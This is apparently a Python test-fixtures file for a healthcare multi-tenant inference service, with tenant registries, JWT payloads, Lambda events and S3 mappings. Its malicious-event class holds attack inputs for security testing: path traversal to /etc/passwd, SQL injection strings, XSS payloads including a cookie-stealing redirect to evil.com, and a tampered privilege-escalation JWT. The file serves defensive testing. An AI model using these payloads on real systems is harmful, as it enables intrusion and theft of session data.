"""
Test data fixtures for PICASSO tenant inference system
Realistic healthcare scenarios and comprehensive test data
"""

import json
import time
from datetime import datetime, timedelta
from conftest import create_jwt_token, TEST_ENVIRONMENT


class HealthcareTenantFixtures:
    """Healthcare-specific tenant test fixtures"""
    
    @staticmethod
    def get_medical_center_registry():
        """Large medical center with multiple departments"""
        return {
            'hosts': {
                'portal.stmaryshospital.org': 'stmarys001',
                'ehr.stmaryshospital.org': 'stmarys001',
                'imaging.stmaryshospital.org': 'stmarys001',
                'pharmacy.stmaryshospital.org': 'stmarys001',
                'billing.stmaryshospital.org': 'stmarys001'
            },
            'origins': {
                'https://portal.stmaryshospital.org': 'stmarys001',
                'https://ehr.stmaryshospital.org': 'stmarys001',
                'https://imaging.stmaryshospital.org': 'stmarys001'
            },
            'paths': {
                '/stmarys/portal': 'stmarys001',
                '/stmarys/ehr': 'stmarys001',
                '/stmarys/imaging': 'stmarys001',
                '/stmarys/pharmacy': 'stmarys001'
            },
            'hashes': {'stmarys001'},
            'loaded_at': time.time()
        }
    
    @staticmethod
    def get_multi_clinic_registry():
        """Multiple independent clinics"""
        return {
            'hosts': {
                'westside-clinic.com': 'westside001',
                'eastbay-medical.org': 'eastbay001',
                'downtown-health.net': 'downtown001',
                'suburban-care.ai': 'suburban001',
                'emergency-med.io': 'emergency001'
            },
            'origins': {
                'https://westside-clinic.com': 'westside001',
                'https://eastbay-medical.org': 'eastbay001',
                'https://downtown-health.net': 'downtown001',
                'https://suburban-care.ai': 'suburban001',
                'https://emergency-med.io': 'emergency001'
            },
            'paths': {
                '/westside/appointments': 'westside001',
                '/eastbay/patients': 'eastbay001',
                '/downtown/records': 'downtown001',
                '/suburban/portal': 'suburban001',
                '/emergency/triage': 'emergency001'
            },
            'hashes': {
                'westside001', 'eastbay001', 'downtown001', 
                'suburban001', 'emergency001'
            },
            'loaded_at': time.time()
        }
    
    @staticmethod
    def get_specialty_providers_registry():
        """Specialty healthcare providers"""
        return {
            'hosts': {
                'cardiology-specialists.com': 'cardio001',
                'oncology-center.org': 'onco001',
                'pediatric-care.net': 'pedia001',
                'mental-health-clinic.ai': 'mental001',
                'orthopedic-surgery.com': 'ortho001'
            },
            'origins': {
                'https://cardiology-specialists.com': 'cardio001',
                'https://oncology-center.org': 'onco001',
                'https://pediatric-care.net': 'pedia001'
            },
            'paths': {
                '/cardiology/consultations': 'cardio001',
                '/oncology/treatments': 'onco001',
                '/pediatrics/checkups': 'pedia001',
                '/mental-health/sessions': 'mental001',
                '/orthopedics/surgeries': 'ortho001'
            },
            'hashes': {
                'cardio001', 'onco001', 'pedia001', 
                'mental001', 'ortho001'
            },
            'loaded_at': time.time()
        }


class JWTTokenFixtures:
    """JWT token fixtures for various scenarios"""
    
    @staticmethod
    def get_valid_doctor_token():
        """Valid JWT token for doctor access"""
        payload = {
            'iss': f'picasso-{TEST_ENVIRONMENT}',
            'aud': 'streaming-function',
            'purpose': 'stream',
            'tenantId': 'stmarys001',
            'sessionId': f'sess_doctor_{int(time.time())}_abc123',
            'jti': f'jwt_doctor_{int(time.time())}_def456',
            'role': 'physician',
            'department': 'cardiology',
            'iat': int(time.time()),
            'exp': int(time.time() + 900)  # 15 minutes
        }
        return create_jwt_token(payload)
    
    @staticmethod
    def get_valid_nurse_token():
        """Valid JWT token for nurse access"""
        payload = {
            'iss': f'picasso-{TEST_ENVIRONMENT}',
            'aud': 'streaming-function',
            'purpose': 'stream',
            'tenantId': 'eastbay001',
            'sessionId': f'sess_nurse_{int(time.time())}_xyz789',
            'jti': f'jwt_nurse_{int(time.time())}_ghi012',
            'role': 'nurse',
            'department': 'emergency',
            'iat': int(time.time()),
            'exp': int(time.time() + 900)
        }
        return create_jwt_token(payload)
    
    @staticmethod
    def get_valid_admin_token():
        """Valid JWT token for admin access"""
        payload = {
            'iss': f'picasso-{TEST_ENVIRONMENT}',
            'aud': 'master-function',
            'purpose': 'manage',
            'tenantId': 'downtown001',
            'sessionId': f'sess_admin_{int(time.time())}_mno345',
            'jti': f'jwt_admin_{int(time.time())}_pqr678',
            'role': 'admin',
            'department': 'it',
            'iat': int(time.time()),
            'exp': int(time.time() + 900)
        }
        return create_jwt_token(payload)
    
    @staticmethod
    def get_expired_token():
        """Expired JWT token for testing"""
        past_time = datetime.utcnow() - timedelta(minutes=30)
        payload = {
            'iss': f'picasso-{TEST_ENVIRONMENT}',
            'aud': 'streaming-function',
            'purpose': 'stream',
            'tenantId': 'expired001',
            'sessionId': 'sess_expired_old123',
            'jti': 'jwt_expired_old456',
            'iat': int(past_time.timestamp()),
            'exp': int((past_time + timedelta(minutes=15)).timestamp())
        }
        return create_jwt_token(payload)
    
    @staticmethod
    def get_config_management_token():
        """Config management token for testing"""
        payload = {
            'iss': f'picasso-{TEST_ENVIRONMENT}',
            'aud': 'master-function',
            'purpose': 'config',
            'tenantId': 'config001',
            'sessionId': f'sess_config_{int(time.time())}_cfg123',
            'jti': f'jwt_config_{int(time.time())}_cfg456',
            'role': 'system',
            'department': 'infrastructure',
            'iat': int(time.time()),
            'exp': int(time.time() + 900)
        }
        return create_jwt_token(payload)


class LambdaEventFixtures:
    """Lambda event fixtures for various scenarios"""
    
    @staticmethod
    def get_doctor_portal_event():
        """Doctor accessing patient portal"""
        return {
            'headers': {
                'host': 'portal.stmaryshospital.org',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'authorization': f'Bearer {JWTTokenFixtures.get_valid_doctor_token()}',
                'origin': 'https://portal.stmaryshospital.org',
                'referer': 'https://portal.stmaryshospital.org/login'
            },
            'requestContext': {
                'requestId': 'doctor-portal-12345',
                'identity': {
                    'sourceIp': '10.5.0.100'
                },
                'http': {
                    'path': '/stmarys/portal/patients/dashboard'
                }
            },
            'path': '/stmarys/portal/patients/dashboard',
            'queryStringParameters': {
                'department': 'cardiology',
                'view': 'active_patients'
            }
        }
    
    @staticmethod
    def get_nurse_ehr_event():
        """Nurse accessing EHR system"""
        return {
            'headers': {
                'host': 'ehr.eastbay-medical.org',
                'User-Agent': 'EHR-Mobile-App/2.1.0 (iOS 15.0)',
                'authorization': f'Bearer {JWTTokenFixtures.get_valid_nurse_token()}',
                'origin': 'https://eastbay-medical.org'
            },
            'requestContext': {
                'requestId': 'nurse-ehr-67890',
                'identity': {
                    'sourceIp': '192.168.10.50'
                }
            },
            'path': '/eastbay/patients/vitals',
            'queryStringParameters': {
                'patient_id': 'P123456',
                'shift': 'evening'
            }
        }
    
    @staticmethod
    def get_emergency_triage_event():
        """Emergency department triage system"""
        return {
            'headers': {
                'host': 'emergency-med.io',
                'User-Agent': 'EmergencyTriage/3.0 Healthcare-System',
                'X-Forwarded-For': '203.0.113.10, 10.0.0.1',
                'X-Real-IP': '203.0.113.10'
            },
            'requestContext': {
                'requestId': 'emergency-triage-54321',
                'identity': {
                    'sourceIp': '203.0.113.10'
                }
            },
            'path': '/emergency/triage/intake',
            'queryStringParameters': {
                't': 'emergency001',
                'severity': 'high',
                'timestamp': str(int(time.time()))
            }
        }
    
    @staticmethod
    def get_telehealth_event():
        """Telehealth consultation"""
        return {
            'headers': {
                'host': 'telehealth.suburban-care.ai',
                'User-Agent': 'TelehealthClient/1.5.0 WebRTC-Enabled',
                'origin': 'https://patient-portal.suburban-care.ai'
            },
            'requestContext': {
                'requestId': 'telehealth-98765',
                'identity': {
                    'sourceIp': '98.76.54.32'
                }
            },
            'path': '/suburban/telehealth/consultation',
            'queryStringParameters': {
                'session_id': 'teleh_' + str(int(time.time())),
                'provider_id': 'DOC001',
                'patient_id': 'PAT789'
            }
        }
    
    @staticmethod
    def get_pharmacy_prescription_event():
        """Pharmacy prescription lookup"""
        return {
            'headers': {
                'host': 'pharmacy.stmaryshospital.org',
                'User-Agent': 'PharmacySystem/4.2.1 (Hospital-Integration)',
                'authorization': f'Bearer {JWTTokenFixtures.get_valid_doctor_token()}'
            },
            'requestContext': {
                'requestId': 'pharmacy-rx-11111',
                'identity': {
                    'sourceIp': '172.16.20.100'
                }
            },
            'path': '/stmarys/pharmacy/prescriptions',
            'queryStringParameters': {
                'patient_mrn': 'MRN987654321',
                'prescription_id': 'RX001122',
                'verification': 'required'
            }
        }


class MaliciousEventFixtures:
    """Malicious/attack event fixtures for security testing"""
    
    @staticmethod
    def get_path_traversal_attack():
        """Path traversal attack attempt"""
        return {
            'headers': {
                'host': 'attack.example.com',
                'User-Agent': 'AttackBot/1.0'
            },
            'requestContext': {
                'requestId': 'path-traversal-attack',
                'identity': {
                    'sourceIp': '192.0.2.100'
                }
            },
            'path': '/../../../../../../etc/passwd',
            'queryStringParameters': {
                'file': '../../../config/database.yml'
            }
        }
    
    @staticmethod
    def get_sql_injection_attack():
        """SQL injection attack attempt"""
        return {
            'headers': {
                'host': 'vulnerable.example.com',
                'User-Agent': 'SQLMap/1.5.7'
            },
            'requestContext': {
                'requestId': 'sql-injection-attack',
                'identity': {
                    'sourceIp': '192.0.2.200'
                }
            },
            'path': '/search/patients',
            'queryStringParameters': {
                't': "'; DROP TABLE patients; --",
                'search': "' UNION SELECT * FROM admin_users --",
                'filter': "' OR '1'='1"
            }
        }
    
    @staticmethod
    def get_xss_attack():
        """Cross-site scripting attack attempt"""
        return {
            'headers': {
                'host': '<script>alert("XSS")</script>.evil.com',
                'User-Agent': '<img src=x onerror=alert("XSS")>',
                'origin': 'javascript:alert("XSS")',
                'referer': '<iframe src="javascript:alert(\'XSS\')"></iframe>'
            },
            'requestContext': {
                'requestId': 'xss-attack-attempt',
                'identity': {
                    'sourceIp': '192.0.2.50'
                }
            },
            'path': '/<script>alert("XSS")</script>',
            'queryStringParameters': {
                't': '<script>document.location="http://evil.com/steal?cookie="+document.cookie</script>',
                'callback': 'alert("XSS")'
            }
        }
    
    @staticmethod
    def get_ddos_attack_events():
        """Distributed denial of service attack events"""
        attack_events = []
        for i in range(50):  # Many rapid requests
            event = {
                'headers': {
                    'host': f'ddos-target-{i % 5}.com',
                    'User-Agent': f'DDoSBot/{i % 10}.0'
                },
                'requestContext': {
                    'requestId': f'ddos-attack-{i:04d}',
                    'identity': {
                        'sourceIp': f'192.0.2.{100 + (i % 50)}'  # Distributed IPs
                    }
                },
                'path': f'/overload/resource/{i}',
                'queryStringParameters': {
                    'payload': 'x' * (i * 10),  # Increasing payload size
                    'amplify': str(i)
                }
            }
            attack_events.append(event)
        return attack_events
    
    @staticmethod
    def get_jwt_manipulation_attack():
        """JWT token manipulation attack"""
        # Create malicious JWT with tampered signature
        malicious_payload = {
            'iss': f'picasso-{TEST_ENVIRONMENT}',
            'aud': 'streaming-function',
            'purpose': 'admin',  # Privilege escalation attempt
            'tenantId': 'admin_backdoor',
            'sessionId': 'hacker_session_666',
            'jti': 'malicious_jwt_id',
            'role': 'super_admin',  # Unauthorized role
            'iat': int(time.time()),
            'exp': int(time.time() + 86400)  # 24 hours (too long)
        }
        
        # Create with wrong secret to simulate tampering
        malicious_token = create_jwt_token(malicious_payload, secret='wrong-secret')
        
        return {
            'headers': {
                'host': 'secure-system.com',
                'User-Agent': 'JWTManipulator/1.0',
                'authorization': f'Bearer {malicious_token}'
            },
            'requestContext': {
                'requestId': 'jwt-manipulation-attack',
                'identity': {
                    'sourceIp': '192.0.2.150'
                }
            },
            'path': '/admin/backdoor',
            'queryStringParameters': {
                'privilege_escalation': 'true',
                'bypass_auth': 'yes'
            }
        }


class PerformanceTestFixtures:
    """Performance test fixtures"""
    
    @staticmethod
    def get_high_load_events(count=1000):
        """Generate high load test events"""
        events = []
        tenants = ['perf001', 'perf002', 'perf003', 'perf004', 'perf005']
        hosts = ['perf1.com', 'perf2.org', 'perf3.net', 'perf4.ai', 'perf5.io']
        
        for i in range(count):
            event = {
                'headers': {
                    'host': hosts[i % len(hosts)],
                    'User-Agent': f'LoadTester/{i % 100}',
                    'authorization': f'Bearer {JWTTokenFixtures.get_valid_doctor_token()}'
                },
                'requestContext': {
                    'requestId': f'load-test-{i:06d}',
                    'identity': {
                        'sourceIp': f'10.{(i // 256) % 256}.{(i // 16) % 256}.{i % 256}'
                    }
                },
                'path': f'/api/load/test/{i}',
                'queryStringParameters': {
                    't': tenants[i % len(tenants)],
                    'iteration': str(i),
                    'batch': str(i // 100)
                }
            }
            events.append(event)
        
        return events
    
    @staticmethod
    def get_concurrent_user_events(user_count=50):
        """Generate events simulating concurrent users"""
        events = []
        
        for user_id in range(user_count):
            # Each user makes multiple requests
            for req_num in range(5):
                event = {
                    'headers': {
                        'host': f'concurrent-test-{user_id % 10}.com',
                        'User-Agent': f'ConcurrentClient/{user_id}',
                        'X-User-ID': f'user_{user_id:04d}'
                    },
                    'requestContext': {
                        'requestId': f'concurrent-u{user_id:04d}-r{req_num}',
                        'identity': {
                            'sourceIp': f'172.20.{user_id % 255}.{req_num + 1}'
                        }
                    },
                    'path': f'/api/user/{user_id}/request/{req_num}',
                    'queryStringParameters': {
                        'user_session': f'session_{user_id}_{req_num}',
                        'timestamp': str(int(time.time()) + req_num)
                    }
                }
                events.append(event)
        
        return events


class S3MappingFixtures:
    """S3 tenant mapping data fixtures"""
    
    @staticmethod
    def get_healthcare_s3_mappings():
        """Comprehensive healthcare S3 mappings"""
        return {
            'stmarys001.json': {
                'tenant_name': "St. Mary's Regional Medical Center",
                'host': 'portal.stmaryshospital.org',
                'origin': 'https://portal.stmaryshospital.org',
                'path': '/stmarys/portal',
                'tenant_type': 'hospital',
                'security_level': 'hipaa_compliant',
                'departments': ['cardiology', 'emergency', 'surgery', 'pediatrics'],
                'created_at': '2024-01-15T00:00:00Z',
                'last_updated': '2024-01-20T12:00:00Z',
                'contact_email': 'it-admin@stmaryshospital.org',
                'compliance_certifications': ['HIPAA', 'SOC2', 'HITRUST']
            },
            
            'eastbay001.json': {
                'tenant_name': "East Bay Medical Group",
                'host': 'eastbay-medical.org',
                'origin': 'https://eastbay-medical.org',
                'path': '/eastbay/patients',
                'tenant_type': 'clinic_group',
                'security_level': 'high',
                'departments': ['family_medicine', 'internal_medicine', 'pediatrics'],
                'created_at': '2024-01-10T00:00:00Z',
                'last_updated': '2024-01-18T15:30:00Z',
                'contact_email': 'admin@eastbay-medical.org',
                'compliance_certifications': ['HIPAA', 'SOC2']
            },
            
            'emergency001.json': {
                'tenant_name': "Metro Emergency Medical Services",
                'host': 'emergency-med.io',
                'origin': 'https://emergency-med.io',
                'path': '/emergency/triage',
                'tenant_type': 'emergency_services',
                'security_level': 'critical',
                'departments': ['emergency', 'trauma', 'ambulatory'],
                'created_at': '2024-01-05T00:00:00Z',
                'last_updated': '2024-01-22T08:45:00Z',
                'contact_email': 'ops@emergency-med.io',
                'compliance_certifications': ['HIPAA', 'SOC2', 'HITRUST', 'FDA_510K']
            },
            
            'cardio001.json': {
                'tenant_name': "Advanced Cardiology Specialists",
                'host': 'cardiology-specialists.com',
                'origin': 'https://cardiology-specialists.com',
                'path': '/cardiology/consultations',
                'tenant_type': 'specialty_practice',
                'security_level': 'high',
                'departments': ['interventional_cardiology', 'electrophysiology', 'heart_failure'],
                'created_at': '2024-01-12T00:00:00Z',
                'last_updated': '2024-01-19T11:20:00Z',
                'contact_email': 'it@cardiology-specialists.com',
                'compliance_certifications': ['HIPAA', 'SOC2']
            },
            
            'mental001.json': {
                'tenant_name': "Comprehensive Mental Health Center",
                'host': 'mental-health-clinic.ai',
                'origin': 'https://mental-health-clinic.ai',
                'path': '/mental-health/sessions',
                'tenant_type': 'behavioral_health',
                'security_level': 'maximum',
                'departments': ['psychiatry', 'psychology', 'counseling', 'crisis_intervention'],
                'created_at': '2024-01-08T00:00:00Z',
                'last_updated': '2024-01-21T14:15:00Z',
                'contact_email': 'security@mental-health-clinic.ai',
                'compliance_certifications': ['HIPAA', 'SOC2', 'HITRUST', 'STATE_LICENSE'],
                'special_requirements': ['suicide_prevention_protocol', 'crisis_escalation']
            }
        }
    
    @staticmethod
    def get_corrupted_s3_mappings():
        """Corrupted S3 mappings for error testing"""
        return {
            'valid001.json': {
                'tenant_name': "Valid Healthcare Provider",
                'host': 'valid.healthcare.com',
                'origin': 'https://valid.healthcare.com',
                'path': '/valid/endpoint'
            },
            
            'corrupted001.json': '{"tenant_name": "Corrupted", invalid json structure',
            
            'empty002.json': '',
            
            'invalid003.json': 'not json at all - just plain text',
            
            'missing_fields004.json': {
                'tenant_name': "Missing Required Fields"
                # Missing host, origin, path
            }
        }


class AuditLogFixtures:
    """Audit log test fixtures"""
    
    @staticmethod
    def get_expected_success_audit():
        """Expected structure for successful inference audit"""
        return {
            'event': 'tenant_inference_success',
            'inference_type': 'jwt_inference',
            'tenant_hash': 'stmarys001',
            'source': 'jwt_token',
            'timestamp': int(time.time()),
            'source_ip': '10.5.0.100',
            'environment': TEST_ENVIRONMENT
        }
    
    @staticmethod
    def get_expected_failure_audit():
        """Expected structure for failed inference audit"""
        return {
            'failure_id': 'generated_uuid',
            'reason': 'no_tenant_found',
            'timestamp': int(time.time()),
            'source_ip': '192.0.2.100',
            'user_agent': 'AttackBot/1.0',
            'request_id': 'attack-request-123',
            'environment': TEST_ENVIRONMENT
        }
    
    @staticmethod
    def get_expected_security_audit():
        """Expected structure for security incident audit"""
        return {
            'event': 'security_incident',
            'incident_type': 'path_traversal_attempt',
            'severity': 'high',
            'source_ip': '192.0.2.100',
            'user_agent': 'AttackBot/1.0',
            'request_details': {
                'path': '/../../../../../../etc/passwd',
                'host': 'attack.example.com'
            },
            'timestamp': int(time.time()),
            'environment': TEST_ENVIRONMENT,
            'response_action': 'blocked'
        }


# Export all fixture classes for easy import
__all__ = [
    'HealthcareTenantFixtures',
    'JWTTokenFixtures', 
    'LambdaEventFixtures',
    'MaliciousEventFixtures',
    'PerformanceTestFixtures',
    'S3MappingFixtures',
    'AuditLogFixtures'
]